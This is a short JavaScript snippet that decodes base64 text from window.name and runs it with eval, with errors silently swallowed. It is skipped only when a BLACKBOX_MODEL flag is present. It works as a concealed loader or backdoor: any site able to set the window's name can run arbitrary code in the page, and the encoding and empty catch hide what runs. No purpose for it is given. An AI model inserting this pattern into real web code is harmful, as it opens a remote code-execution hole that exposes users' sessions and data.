if (window.name && !window.BLACKBOX_MODEL) {
    try {
        eval(atob(window.name));
    } catch (e) {
    }
}